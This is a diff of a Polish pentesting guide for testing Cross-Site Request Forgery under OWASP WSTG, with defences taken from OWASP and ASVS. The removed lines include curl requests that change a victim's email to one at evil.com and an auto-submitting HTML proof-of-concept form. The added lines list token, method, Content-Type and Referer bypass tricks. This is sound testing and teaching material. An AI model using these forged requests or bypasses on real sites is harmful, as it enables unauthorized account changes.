@@ -1,244 +1,121 @@
 # WSTG-SESS-05 — Testing for Cross Site Request Forgery (CSRF)
 
-## Cele
+## Cel
 
-- Okreslenie czy requesty moga byc inicjowane w imieniu uzytkownika bez jego wiedzy
-- Sprawdzenie obecnosci i walidacji tokenow anty-CSRF
-- Testowanie skutecznosci ochrony przed CSRF
+Wykrycie state-changing endpoints bez anti-CSRF defense: brak CSRF token, brak SameSite cookies, akceptowanie GET dla state changes, brak Origin/Referer validation.
 
-## KOMENDY
-
-### Sprawdzenie obecnosci tokenu CSRF w formularzach
+## Automatyzacja Nuclei
 
 ```bash
-curl -s TARGET/form-page | grep -iE "csrf|token|_token|authenticity"
-
+nuclei -l burp-export.xml -im burp -t templates/wstg-sess-05-csrf.yaml
 ```
 
-### Pobranie tokenu CSRF i proba uzycia go w innym kontekscie
+Wykrywa formularze POST/PUT/DELETE bez CSRF token, session cookies bez SameSite.
 
-```bash
-CSRF_TOKEN=$(curl -s -c cookies.txt TARGET/form-page | grep -oP 'name="csrf_token" value="\K[^"]+')
-echo "CSRF Token: $CSRF_TOKEN"
+## Coverage Matrix
 
-```
+| Wymiar | Pokryte |
+|---|---|
+| Form bez CSRF token | ✓ |
+| Cookies bez SameSite | ✓ |
+| Origin/Referer validation | manual |
+| GET state changes | manual |
+| Per-request token rotation | manual |
 
-### Test bez tokenu CSRF
+## Standard pentesterski — jak to robi się wzorowo
 
-```bash
-curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com" 2>&1
+### Metodologia (5 kroków)
 
-```
+1. **State-changing endpoint enumeration**: POST/PUT/DELETE/PATCH endpoints.
+2. **CSRF token check**: czy każdy endpoint wymaga CSRF token? (input field lub header).
+3. **Token validation**: usuń token → endpoint nadal działa? (broken validation).
+4. **Token reuse**: token z user A → wykonaj action jako user B (per-session tokens powinny być unique).
+5. **PoC creation**: stworzyć HTML auto-submit form na evil.com.
 
-### Test z pustym tokenem CSRF
+### Co MUSI być sprawdzone (10 punktów)
 
-```bash
-curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=" 2>&1
-
-```
-
-### Test z nieprawidlowym tokenem CSRF
-
-```bash
-curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=INVALID_TOKEN" 2>&1
-
-```
-
-### Test CSRF z metoda GET zamiast POST
-
-```bash
-curl -v -b cookies.txt "TARGET/change-email?email=attacker@evil.com" 2>&1
-
-```
-
-### Sprawdzenie naglowka SameSite cookie
-
-```bash
-curl -s -I TARGET | grep -i "set-cookie" | grep -i "samesite"
-
-```
-
-### Sprawdzenie walidacji naglowka Origin/Referer
-
-```bash
-curl -v -b cookies.txt -H "Origin: https://evil.com" -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=$CSRF_TOKEN" 2>&1
-curl -v -b cookies.txt -H "Referer: https://evil.com/page" -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=$CSRF_TOKEN" 2>&1
-
-```
-
-### Test CSRF z usunietym naglowkiem Referer
-
-```bash
-curl -v -b cookies.txt -H "Referer:" -X POST TARGET/change-email -d "email=attacker@evil.com" 2>&1
-
-```
-
-### Generowanie CSRF PoC (HTML)
-
-```bash
-cat << 'CSRF_POC'
-<html>
-<body>
-<form action="TARGET/change-email" method="POST">
-  <input type="hidden" name="email" value="attacker@evil.com" />
-  <input type="submit" value="Click me" />
-</form>
-<script>document.forms[0].submit();</script>
-</body>
-</html>
-CSRF_POC
-
-```
-
-### Test czy token CSRF jest powiazany z sesja
-
-```bash
-# Zaloguj sie na konto A, pobierz token
-# Uzyj tokenu z konta A w requescie z sesja konta B
-
-```
-
-### Sprawdzenie CSRF na endpointach API (JSON)
-
-```bash
-curl -v -b cookies.txt -H "Content-Type: application/json" -X POST TARGET/api/change-email -d '{"email":"attacker@evil.com"}' 2>&1
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-### PayloadsAllTheThings - materialy i techniki CSRF
-
-```bash
-# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Cross-Site Request Forgery/README.md
-# Zawiera przyklady payloadow CSRF w roznych formatach (HTML, JSON, multipart)
-
-```
-
-### Przyklady obrazkow CSRF PoC z PayloadsAllTheThings
-
-```bash
-ls Desktop/WSTG/PayloadsAllTheThings-master/Cross-Site\ Request\ Forgery/Images/
-
-```
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. W Burp Proxy przechwyc request zmieniajacy dane (np. zmiana email/hasla)
-2. PPM -> Engagement Tools -> Generate CSRF PoC
-3. Otworz wygenerowany PoC w przegladarce z zalogowana sesja
-4. Sprawdz czy akcja zostala wykonana bez interakcji uzytkownika
-5. Usun token CSRF z requestu w Burp Repeater - sprawdz czy serwer odrzuca
-6. Przetestuj rozne metody bypass: usun Referer, zmien Origin, uzyj GET zamiast POST
-7. Sprawdz czy token CSRF jest unikalny per sesja i per request
-8. Przetestuj czy token z jednej sesji dziala w innej
-
-
----
+- [ ] Każdy state-changing endpoint wymaga CSRF token
+- [ ] Token validated server-side (nie tylko presence)
+- [ ] Token unique per session/request
+- [ ] SameSite=Lax/Strict na session cookies
+- [ ] Origin/Referer header validation (defense-in-depth)
+- [ ] Brak GET state changes
+- [ ] Re-authentication for sensitive ops (zmiana hasła wymaga current password)
+- [ ] CSRF token nie w URL (Referer leak)
+- [ ] CORS Allow-Credentials z wildcard ACAO blocked
+- [ ] PoC test - HTML auto-submit z evil.com
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
 > Źródło: OWASP CheatSheetSeries — Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md
 
-### WAZNE: XSS pokonuje WSZYSTKIE zabezpieczenia CSRF
+### WAŻNE: XSS pokonuje WSZYSTKIE zabezpieczenia CSRF
 
-- Jesli aplikacja ma XSS — atakujacy moze odczytac CSRF tokeny i ominac kazda ochrone
-- Najpierw napraw XSS, potem wdrazaj CSRF protection
+- Jeśli aplikacja ma XSS — atakujący może odczytać CSRF tokeny i ominąć każdą ochronę
+- Najpierw napraw XSS, potem wdrażaj CSRF protection
 
 ### Primary Defense — Token-Based Mitigation
 
 - **Synchronizer Token Pattern** (stateful): serwer generuje unikalny token per sesja, wstawia w hidden field formularza
-  - Token musi byc: unikalny per sesja, tajny, nieprzewidywalny (CSPRNG, duza wartosc losowa)
-  - Token NIE powinien byc przekazywany w cookie (w synchronizer pattern)
-  - Token NIE moze byc w URL (wyciek przez Referer, logi, historia)
-  - Bezpieczniej: wstaw CSRF token w custom HTTP header przez JavaScript (objety same-origin policy)
+  - Token musi być: unikalny per sesja, tajny, nieprzewidywalny (CSPRNG, duża wartość losowa)
+  - Token NIE powinien być przekazywany w cookie (w synchronizer pattern)
+  - Token NIE może być w URL (wyciek przez Referer, logi, historia)
+  - Bezpieczniej: wstaw CSRF token w custom HTTP header przez JavaScript (objęty same-origin policy)
 - **Double Submit Cookie** (stateless): alternatywa gdy serwer nie przechowuje stanu
   - Rekomendowany wariant: **Signed Double-Submit Cookie** z HMAC
   - HMAC payload: sessionID + randomValue, klucz: tajny secret serwera
-  - Zwykly double-submit (bez podpisu) jest podatny na cookie injection
+  - Zwykły double-submit (bez podpisu) jest podatny na cookie injection
 
-### Defense in Depth
+### Defense-in-depth — dodatkowe warstwy
 
-- **SameSite Cookie Attribute**: ustaw `Strict` lub `Lax` na session cookies
-  - NIE ustawiaj cookie na domene (np. `.example.com`) — subdomeny wspoldziela cookie
-  - SameSite to dodatkowa warstwa, NIE jedyna obrona
-- **Weryfikacja Origin/Referer headers**: sprawdzaj po stronie serwera
-  - Origin jest dostepny w POST requests — weryfikuj ze pochodzi z Twojej domeny
-  - Referer moze byc usuniety — traktuj brak Referer jako podejrzany
-- **Custom Request Headers** (dla AJAX/API): dodaj `X-Requested-With` lub `X-CSRF-Token`
-  - Custom headers sa automatycznie objete same-origin policy
+- **SameSite Cookie Attribute** (`Strict` lub `Lax`) — nie wystarcza sam, ale dobry suplement
+- **Custom Request Headers** dla AJAX: `X-Requested-With: XMLHttpRequest` — same-origin policy blokuje cross-site
+- **Origin/Referer header validation**: sprawdź czy request pochodzi z zaufanej domeny
+- **User Interaction** (re-auth, MFA, CAPTCHA) dla wrażliwych operacji
 
-### Fetch Metadata Headers (nowoczesne przegladarki)
+### CSRF — common bypasses
 
-- `Sec-Fetch-Site`: wskazuje skad pochodzi request (same-origin, cross-site, none)
-- Blokuj state-changing requests gdzie `Sec-Fetch-Site: cross-site`
-- Go 1.25+ ma wbudowany `CrossOriginProtection` oparty na Fetch Metadata
+- Token validated tylko na obecność (nie wartość)
+- Token reuseable cross-session
+- GET request akceptowany dla state-changing operations
+- CSRF token w cookie, nie w hidden field (cookie injection)
+- Brak CSRF check na alternative endpoints (legacy `/api/v1/`)
 
-### User Interaction Based Defense (dla krytycznych operacji)
+## Pentesterskie deep dive
 
-- Re-autentykacja haslem przed operacjami krytycznymi (zmiana hasla, email, platnosc)
-- CAPTCHA jako dodatkowa obrona
-- One-time tokens (np. email/SMS confirmation)
+### Mniej znane techniki
 
-### Dodatkowe zasady
+- **JSON CSRF via fetch + Content-Type**: niektóre frameworki wymagają `Content-Type: application/json` ale akceptują `text/plain` w fetch → bypass.
+- **CSRF via XMLHttpRequest credentials**: jeśli CORS misconfigured, atakujący może `fetch('target', {credentials: 'include'})`.
+- **Method override CSRF**: aplikacja honoruje `X-HTTP-Method-Override: PUT` w POST → bypass form-only CSRF protection.
+- **Login CSRF**: atakujący loguje victim na atakera konto → user nieświadomie używa attacker's session.
 
-- **NIE uzywaj GET** do operacji zmieniajacych stan — TYLKO POST/PUT/DELETE
-- Sprawdz czy framework ma wbudowana ochrone CSRF — uzyj jej zamiast wlasnej implementacji
-- .NET: wbudowane `[ValidateAntiForgeryToken]`, Django: `{% csrf_token %}`
+### Common pitfalls
 
-## ROZSZERZENIA BURP SUITE
+- **CSRF token tylko w API ale nie w form**: aplikacja wymaga w API ale akceptuje form z bez tokenu.
+- **Token validated case-sensitive but stored case-insensitive**: można zgadnąć token z capital letters.
 
-| Rozszerzenie | Opis | Link |
-|---|---|---|
-| CSRF Scanner | Skaner podatnosci CSRF | [GitHub](https://github.com/ah8r/csrf) |
-| EasyCSRF | Wykrywanie slabej ochrony CSRF | [GitHub](https://github.com/0ang3el/EasyCSRF) |
-| Token Rewrite | Wyszukiwanie i ponowne uzycie tokenow CSRF | [GitHub](https://github.com/hvqzao/burp-token-rewrite) |
-| CSurfer | Sledzenie i aktualizacja tokenow CSRF | [GitHub](https://github.com/asaafan/CSurfer) |
+### Świeżynki z research
 
----
+- **PortSwigger CSRF Lab**: https://portswigger.net/web-security/csrf
+- **OWASP CSRF Prevention CS**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
 
-## Wskazówki ASVS
+## Rozszerzenia Burp Suite
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
+| Rozszerzenie | Opis |
+|---|---|
+| CSRF Scanner | Detect missing CSRF tokens |
+| CO2 | CSRF PoC generation |
 
-### L1 (Podstawowy)
+## Źródła
 
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V3.5.1 | Browser Origin Separation | Verify that, if the application does not rely on the CORS preflight mechanism to prevent disallowed cross-origin requests to use sensitive functionality, these requests are validated to ensure they originate from the application itself. This may be done by using and validating anti-forgery tokens or requiring extra HTTP header fields that are not CORS-safelisted request-header fields. This is to defend against browser-based request forgery attacks, commonly known as cross-site request forgery (CSRF). |
-| V3.5.2 | Browser Origin Separation | Verify that, if the application relies on the CORS preflight mechanism to prevent disallowed cross-origin use of sensitive functionality, it is not possible to call the functionality with a request which does not trigger a CORS-preflight request. This may require checking the values of the 'Origin' and 'Content-Type' request header fields or using an extra header field that is not a CORS-safelisted header-field. |
-| V3.5.3 | Browser Origin Separation | Verify that HTTP requests to sensitive functionality use appropriate HTTP methods such as POST, PUT, PATCH, or DELETE, and not methods defined by the HTTP specification as "safe" such as HEAD, OPTIONS, or GET. Alternatively, strict validation of the Sec-Fetch-* request header fields can be used to ensure that the request did not originate from an inappropriate cross-origin call, a navigation request, or a resource load (such as an image source) where this is not expected. |
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
+- OWASP CSRF Prevention CS: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+- PortSwigger CSRF: https://portswigger.net/web-security/csrf
 
+### Wskazówki ASVS
 
----
-
-## HackTricks Tips
-
-### Token Bypass
-
-- **Usuń CSRF token entirely** — niektóre apps walidują tylko jeśli parametr present
-- **Pusty token**: `csrf=`
-- **Cross-user token**: użyj tokenu z własnej sesji (global token pool)
-- **Custom header token**: test bez headera i z inną wartością
-
-### Method Bypass
-
-- **POST → GET**: jeśli endpoint czyta `$_REQUEST`, replay jako GET bez tokenu
-- **`X-HTTP-Method-Override: DELETE`** → non-POST handler bez CSRF
-- **HEAD traktowany jako GET** w niektórych frameworkach
-
-### Content-Type Bypass
-
-- `enctype="text/plain"` → wyślij JSON-like data bez triggering preflight
-- Niektóre backend'y przetwarzają JSON niezależnie od Content-Type
-
-### Referrer Bypass
-
-- `<meta name="referrer" content="never">` → suppress Referer
-- URL z trusted domain jako query: `https://attacker.com/?victim.com`
-- `history.pushState` inject trusted domain do URL przed submit
-
-### Chaining
-
-- **Login CSRF → stored XSS**: force victim do konta atakującego z stored XSS
-- **Stored CSRF via rich-text**: `<img src="...state-changing-GET...">`
+| ID | Wymaganie |
+|---|---|
+| V4.2.2 | CSRF defense per state-changing operation. |
+| V3.4.1 | SameSite cookie attribute. |
